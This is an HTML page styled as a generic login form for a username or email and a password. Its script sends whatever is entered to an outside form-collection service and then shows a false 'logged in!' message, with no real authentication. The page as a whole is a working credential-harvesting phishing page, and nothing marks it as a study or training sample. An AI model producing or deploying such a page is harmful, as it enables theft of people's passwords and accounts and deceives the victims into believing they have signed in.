<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #f2f2f2;
  font-family: Arial, sans-serif;

  display: flex;
  justify-content: center;
  align-items: center;
}

.form-box {
  width: 90%;
  max-width: 380px;
  background: white;
  padding: 25px;
  border-radius: 20px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
}

.title {
  font-size: 15px;
  font-weight: bold;
  margin-bottom: 8px;
  color: #222;
  text-align: left;
}

input {
  width: 100%;
  height: 52px;
  padding: 0 16px;
  margin-bottom: 18px;

  border: 1px solid #ddd;
  border-radius: 12px;
  background: #fafafa;

  font-size: 16px;
  outline: none;
}

input:focus {
  border-color: #111;
  background: white;
}

button {
  width: 100%;
  height: 54px;

  border: none;
  border-radius: 14px;

  background: #111;
  color: white;

  font-size: 16px;
  font-weight: bold;

  box-shadow: 0 6px 15px rgba(0,0,0,0.2);

  transition: 0.2s;
}

button:active {
  transform: scale(0.97);
}

#status {
  margin-top: 15px;
  text-align: center;
  font-size: 14px;
}
</style>
</head>

<body>

<div class="form-box">

  <div class="title">Username/Email</div>
  <input id="text1" type="text" placeholder="Type here">

  <div class="title">Password</div>
  <input id="text2" type="text" placeholder="Type here">

  <button onclick="sendMessage()"> LogIn</button>

  <div id="status"></div>

</div>

<script>
async function sendMessage() {

  const text1 = document.getElementById("text1").value;
  const text2 = document.getElementById("text2").value;
  const status = document.getElementById("status");

  if (!text1 && !text2) {
    status.textContent = "full it first.";
    return;
  }

  status.textContent = "logging in...";

  try {

    const response = await fetch(
      "https://formspree.io/f/xoeqgorv",
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },

        body: JSON.stringify({
          message: text1,
          message2: text2
        })
      }
    );

    if (response.ok) {

      status.textContent = "logged in!";

      document.getElementById("text1").value = "";
      document.getElementById("text2").value = "";

    } else {

      status.textContent = "Something went wrong.";

    }

  } catch (error) {

    status.textContent = "Could not log in.";

  }
}
</script>

</body>
</html>
